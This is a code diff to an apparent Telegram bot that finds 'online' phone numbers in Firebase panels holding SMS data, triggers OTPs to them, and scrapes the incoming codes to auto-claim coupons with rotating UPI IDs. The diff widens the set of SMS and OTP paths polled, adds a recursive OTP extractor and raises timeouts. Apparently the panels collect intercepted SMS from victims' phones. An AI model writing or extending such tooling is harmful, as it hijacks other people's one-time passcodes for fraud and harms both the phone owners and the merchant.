@@ -50,7 +50,7 @@ logger = logging.getLogger(__name__)
 
 CLAIMS_DATA_FILE = "claimed_coupons.json"  # Stores claimed coupon logs from both Direct Mobile and Firebase flows
 MAX_DIRECT_LINKS = 20  # Requires a .txt or .zip file if more than 20 links are submitted
-MAX_CONCURRENT_REQUESTS = 50  # High concurrency limit for fast bulk Firebase URL checking
+MAX_CONCURRENT_REQUESTS = 25  # Balanced concurrency limit for checking Firebase URLs
 MAX_FIREBASE_UPI_USES = 8  # Fixed usage limit per fresh UPI ID
 MAX_FIREBASE_NUMBER_USES = 8  # Fixed usage limit per verified working Firebase number (1st claim + up to 7 more)
 MAX_SEND_RETRIES = 2  # Maximum OTP send attempts per online mobile number
@@ -294,6 +294,7 @@ async def get_shared_browser(headless: bool = True, force_restart: bool = False)
                 "--disable-dev-shm-usage",
                 "--disable-gpu",
                 "--no-zygote",
+                "--single-process",
                 "--disable-features=IsolateOrigins,site-per-process",
                 "--ignore-certificate-errors",
             ],
@@ -697,7 +698,7 @@ async def init_user_session(chat_id: int) -> bool:
 
 
 # ==========================================
-# 3. FIREBASE STATUS CHECKER (FAST CHECK)
+# 3. FIREBASE STATUS CHECKER & OTP FETCHER
 # ==========================================
 _fb_http_session: Optional[requests.Session] = None
 _fb_aiohttp_session: Optional[aiohttp.ClientSession] = None
@@ -723,7 +724,7 @@ async def _get_fb_aiohttp_session() -> aiohttp.ClientSession:
             _fb_aiohttp_session = aiohttp.ClientSession(
                 connector=connector,
                 trust_env=False,
-                timeout=aiohttp.ClientTimeout(total=4.5, connect=2.0, sock_read=3.0),
+                timeout=aiohttp.ClientTimeout(total=6.0, connect=2.5, sock_read=4.0),
             )
         return _fb_aiohttp_session
 
@@ -897,7 +898,7 @@ def _is_firebase_node_online(node: dict) -> bool:
     return False
 
 
-async def is_firebase_active(fb_url: str, timeout: int = 5) -> Dict[str, Any]:
+async def is_firebase_active(fb_url: str, timeout: int = 8) -> Dict[str, Any]:
     """
     Checks whether a Firebase database is accessible and contains any active/online source
     or recent SMS/activity (within 10 minutes / 600s).
@@ -1039,7 +1040,7 @@ def check_firebase_sms_status(firebase_url: str) -> str:
     sess = _get_fb_http_session()
 
     try:
-        response = sess.get(target_url, timeout=(2.5, 4.0))
+        response = sess.get(target_url, timeout=(5.0, 8.0))
         response.raise_for_status()
         data = response.json()
         return _evaluate_firebase_payload(data)
@@ -1306,7 +1307,7 @@ def get_online_numbers(firebase_url: str) -> list[dict]:
     for node in ("numbers.json", "clients.json", "devices.json", "users.json"):
         target = f"{root_url}/{node}{q_suffix}"
         try:
-            res = requests.get(target, timeout=5)
+            res = requests.get(target, timeout=6)
             if res.status_code == 200 and res.json():
                 data = res.json()
                 online_list = []
@@ -1323,7 +1324,7 @@ def get_online_numbers(firebase_url: str) -> list[dict]:
 
     root_target = _build_firebase_query_url(firebase_url, "")
     try:
-        res = requests.get(root_target, timeout=5)
+        res = requests.get(root_target, timeout=6)
         if res.status_code == 200 and res.json():
             data = res.json()
             online_list = []
@@ -1351,7 +1352,7 @@ def _panel_has_recent_sms_or_activity(firebase_url: str, max_age_sec: int = 600)
     """Checks whether a Firebase panel has any SMS or activity within max_age_sec (default 10 min)."""
     target_url = _build_firebase_query_url(firebase_url, "")
     try:
-        res = requests.get(target_url, timeout=4)
+        res = requests.get(target_url, timeout=5)
         if res.status_code == 200 and res.json():
             data = res.json()
             timestamps: list[float] = []
@@ -1384,18 +1385,26 @@ def trigger_otp_send(number: str, otp_sender_fn: Optional[Callable[[str], bool]]
 def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
     """Polls Firebase every 1 second for up to WAIT_SECONDS (10s) for a newly arrived 6-digit OTP."""
     root_url, query = _get_firebase_root_and_query(firebase_url)
-    target = f"{root_url}/numbers/{number_id}/otp.json" + (f"?{query}" if query else "")
+    q_suffix = f"?{query}" if query else ""
+    targets = [
+        f"{root_url}/numbers/{number_id}/otp.json{q_suffix}",
+        f"{root_url}/clients/{number_id}/otp.json{q_suffix}",
+        f"{root_url}/numbers/{number_id}.json{q_suffix}",
+        f"{root_url}/clients/{number_id}.json{q_suffix}",
+    ]
     for _ in range(WAIT_SECONDS):
-        try:
-            res = requests.get(target, timeout=5)
-            if res.status_code == 200:
-                otp_val = res.json()
-                if otp_val is not None:
-                    matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(otp_val).strip())
+        for target in targets:
+            try:
+                res = requests.get(target, timeout=5)
+                if res.status_code == 200 and res.json() is not None:
+                    val = res.json()
+                    if isinstance(val, dict) and "otp" in val:
+                        val = val["otp"]
+                    matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(val).strip())
                     if matched:
                         return matched.group(1)
-        except Exception:
-            pass
+            except Exception:
+                pass
         time.sleep(1)
     return None
 
@@ -1403,8 +1412,9 @@ def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
 def clear_old_otp(firebase_url: str, number_id: str) -> None:
     """Clears stale OTP entries before dispatching a new OTP."""
     root_url, query = _get_firebase_root_and_query(firebase_url)
+    q_suffix = f"?{query}" if query else ""
     for path in (f"numbers/{number_id}", f"clients/{number_id}"):
-        target = f"{root_url}/{path}.json" + (f"?{query}" if query else "")
+        target = f"{root_url}/{path}.json{q_suffix}"
         try:
             requests.patch(target, json={"otp": ""}, timeout=4)
         except Exception:
@@ -1555,6 +1565,59 @@ async def _http_raw(method: str, url: str, timeout: float = 5) -> tuple[int, Opt
     return await asyncio.to_thread(_http_raw_sync, method, url, timeout)
 
 
+def _extract_otp_candidates_from_any(obj: Any, floor_ms: int = 0) -> list[str]:
+    """Extracts 6-digit OTPs from dicts/lists/strings, prioritizing OTP/SMS-like fields."""
+    found: list[str] = []
+    text_fields = (
+        "body", "message", "text", "sms", "msg", "content",
+        "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP", "code",
+    )
+
+    def _add_otp(raw_val: Any) -> None:
+        if raw_val is None or isinstance(raw_val, bool):
+            return
+        s = str(raw_val).strip()
+        if not s:
+            return
+        for pat in OTP_PATTERNS:
+            for m in pat.finditer(s):
+                code = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
+                if len(code) == 6 and code not in found:
+                    found.append(code)
+
+    def _walk(node: Any, key_hint: str = "") -> None:
+        if isinstance(node, dict):
+            if "otp" in node and node["otp"] is not None:
+                _add_otp(node["otp"])
+            for k, v in node.items():
+                k_str = str(k)
+                k_low = k_str.lower()
+                if floor_ms > 0 and k_str.isdigit():
+                    try:
+                        ts_val = int(k_str)
+                        if ts_val > 1e11 and ts_val < floor_ms - 10000:
+                            continue
+                    except ValueError:
+                        pass
+                if isinstance(v, (dict, list)):
+                    _walk(v, k_low)
+                elif k_low in text_fields or any(kw in k_low for kw in ("otp", "sms", "msg", "body", "text", "code")):
+                    _add_otp(v)
+                elif isinstance(v, str) and any(kw in v.lower() for kw in OTP_KEYWORDS):
+                    _add_otp(v)
+        elif isinstance(node, list):
+            for item in node:
+                _walk(item, key_hint)
+        elif isinstance(node, str):
+            if any(kw in key_hint for kw in ("otp", "sms", "msg", "body", "text", "code")) or any(
+                kw in node.lower() for kw in OTP_KEYWORDS
+            ):
+                _add_otp(node)
+
+    _walk(obj)
+    return found
+
+
 async def fetch_otp_from_firebase(
     fb_url: str,
     client_id: str,
@@ -1564,7 +1627,7 @@ async def fetch_otp_from_firebase(
 ) -> Optional[str]:
     exclude = exclude or set()
     start = time.time()
-    floor = int(trigger_ms) - 5000
+    floor = int(trigger_ms) - 10000
     root_url, query = _get_firebase_root_and_query(fb_url)
     base = root_url.rstrip("/")
     q_suffix = f"?{query}" if query else ""
@@ -1579,6 +1642,13 @@ async def fetch_otp_from_firebase(
         f"{base}/Sms/{cid}.json",
         f"{base}/numbers/{cid}.json",
         f"{base}/clients/{cid}.json",
+        f"{base}/messages.json",
+        f"{base}/All_User/Sms.json",
+        f"{base}/All_Users/Sms.json",
+        f"{base}/user_sms.json",
+        f"{base}/sms.json",
+        f"{base}/Sms.json",
+        _build_firebase_query_url(fb_url, ""),
     ] if cid else [
         f"{base}/messages.json",
         f"{base}/All_User/Sms.json",
@@ -1590,94 +1660,53 @@ async def fetch_otp_from_firebase(
     ]
     paths = list(dict.fromkeys(p + q_suffix for p in raw_paths))
 
-    text_fields = (
-        "body", "message", "text", "sms", "msg", "content",
-        "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP",
-    )
-
     while time.time() - start < timeout:
         for url in paths:
-            status, data = await _http_raw("GET", url, timeout=4)
-            if status != 200 or not isinstance(data, dict) or not data:
+            status, data = await _http_raw("GET", url, timeout=4.5)
+            if status != 200 or not data:
                 continue
-
-            if "otp" in data and data["otp"] is not None:
-                matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(data["otp"]).strip())
-                if matched and matched.group(1) not in exclude:
-                    return matched.group(1)
-
-            for mid in sorted(data.keys(), reverse=True):
-                msg = data[mid]
-                if not isinstance(msg, dict):
-                    continue
-                try:
-                    if int(mid) < floor:
-                        continue
-                except (ValueError, TypeError):
-                    pass
-                text = ""
-                for f in text_fields:
-                    v = msg.get(f)
-                    if v:
-                        text = str(v)
-                        break
-                if not text:
-                    continue
-                if not any(kw in text.lower() for kw in OTP_KEYWORDS):
-                    continue
-                for pat in OTP_PATTERNS:
-                    m = pat.search(text)
-                    if m:
-                        otp = m.group(1) if m.groups() else m.group(0)
-                        otp = re.sub(r"\D", "", otp)
-                        if len(otp) == 6 and otp not in exclude:
-                            return otp
+            candidates = _extract_otp_candidates_from_any(data, floor_ms=floor)
+            for otp in candidates:
+                if len(otp) == 6 and otp.isdigit() and otp not in exclude:
+                    return otp
         await asyncio.sleep(0.5)
     return None
 
 
 def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optional[str], baseline_otps: list[str]) -> Optional[str]:
     """
-    Polls the single Firebase endpoint every 1 second for up to WAIT_SECONDS (10s)
-    for a new 6-digit OTP specifically associated with the target number.
+    Polls Firebase every 1 second for up to WAIT_SECONDS (10s)
+    for a new 6-digit OTP associated with the target number or panel.
     """
     root_url, query = _get_firebase_root_and_query(firebase_url)
     q_suffix = f"?{query}" if query else ""
+    base = root_url.rstrip("/")
     target_urls = []
     if number_id:
-        target_urls.append(f"{root_url}/numbers/{number_id}/otp.json{q_suffix}")
-        target_urls.append(f"{root_url}/clients/{number_id}/otp.json{q_suffix}")
+        for p in (
+            f"{base}/numbers/{number_id}/otp.json",
+            f"{base}/clients/{number_id}/otp.json",
+            f"{base}/numbers/{number_id}.json",
+            f"{base}/clients/{number_id}.json",
+            f"{base}/messages/{number_id}.json",
+            f"{base}/sms/{number_id}.json",
+            f"{base}/user_sms/{number_id}.json",
+            f"{base}/All_User/Sms/{number_id}.json",
+        ):
+            target_urls.append(p + q_suffix)
     target_urls.append(_build_firebase_query_url(firebase_url, ""))
+    target_urls = list(dict.fromkeys(target_urls))
+    excluded_set = set(baseline_otps)
 
     for _ in range(WAIT_SECONDS):
         for target_url in target_urls:
             try:
-                res = requests.get(target_url, timeout=4)
+                res = requests.get(target_url, timeout=4.5)
                 if res.status_code == 200 and res.json() is not None:
                     payload_val = res.json()
-                    if isinstance(payload_val, dict):
-                        for mid in sorted(payload_val.keys(), reverse=True):
-                            msg = payload_val[mid]
-                            if isinstance(msg, dict):
-                                text = ""
-                                for f in (
-                                    "body", "message", "text", "sms", "msg", "content",
-                                    "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP",
-                                ):
-                                    v = msg.get(f)
-                                    if v:
-                                        text = str(v)
-                                        break
-                                if text and any(kw in text.lower() for kw in OTP_KEYWORDS):
-                                    for pat in OTP_PATTERNS:
-                                        m = pat.search(text)
-                                        if m:
-                                            otp = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
-                                            if len(otp) == 6 and otp not in baseline_otps:
-                                                return otp
-                    matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(payload_val).strip())
-                    if matched and matched.group(1) not in baseline_otps:
-                        return matched.group(1)
+                    for otp in _extract_otp_candidates_from_any(payload_val, floor_ms=0):
+                        if len(otp) == 6 and otp.isdigit() and otp not in excluded_set:
+                            return otp
             except Exception:
                 pass
         time.sleep(1)
@@ -1685,13 +1714,17 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
 
 
 def _get_baseline_otps_sync(firebase_url: str) -> list[str]:
-    """Captures pre-existing 6-digit OTPs from the single Firebase endpoint before triggering a new OTP."""
+    """Captures pre-existing 6-digit OTPs from the Firebase endpoint before triggering a new OTP."""
     target_url = _build_firebase_query_url(firebase_url, "")
     existing = []
     try:
-        res = requests.get(target_url, timeout=4)
+        res = requests.get(target_url, timeout=5)
         if res.status_code == 200 and res.json():
-            raw_dump = json.dumps(res.json(), ensure_ascii=False)
+            data = res.json()
+            for o in _extract_otp_candidates_from_any(data, floor_ms=0):
+                if len(o) == 6 and o not in existing:
+                    existing.append(o)
+            raw_dump = json.dumps(data, ensure_ascii=False)
             for o in extract_numbers_and_otps(raw_dump).get("otps", []):
                 if len(o) == 6 and o not in existing:
                     existing.append(o)
@@ -1755,7 +1788,7 @@ def _mark_panel_status_in_session(context: ContextTypes.DEFAULT_TYPE, fb_url: st
 
 
 async def _send_active_panels_txt_file(message_target, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Creates and sends a .txt file (GBX_PANNEL.txt) containing all verified active Firebase panel URLs."""
+    """Creates and sends a .txt file (GBX_PANNEL.txt) containing verified active Firebase panel URLs."""
     session_panels: dict = context.user_data.get("session_panels", {})
     active_urls = [
         ep for ep, info in session_panels.items()
@@ -1793,7 +1826,7 @@ async def auto_claim_triplet_on_woohoo(
     """
     Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet
     panel-by-panel in order:
-    1. Checks the first saved Firebase panel for recent SMS/activity (within 10m / 10s check) and fetches online numbers.
+    1. Checks saved Firebase panels in order and fetches online numbers.
     2. Dispatches OTP to an online number and polls/fetches OTP; if none arrives, checks the next online number in that panel.
     3. Once all numbers in the current panel are exhausted, switches to the next saved Firebase panel in order.
     4. Automatically completes Step 2 (OTP Verification) and Step 3 (UPI Submission).
@@ -2392,7 +2425,7 @@ def save_panels_to_user_session(context: ContextTypes.DEFAULT_TYPE, new_results:
 
     for item in new_results:
         endpoint = item["firebase_endpoint"]
-        status_str = item.get("status", "Saved (Pending live check)")
+        status_str = item.get("status", "Saved (Queued for live check)")
         is_active = item.get("is_active", status_str.startswith("Active"))
         session_panels[endpoint] = {
             "submitted_url": item["submitted_url"],
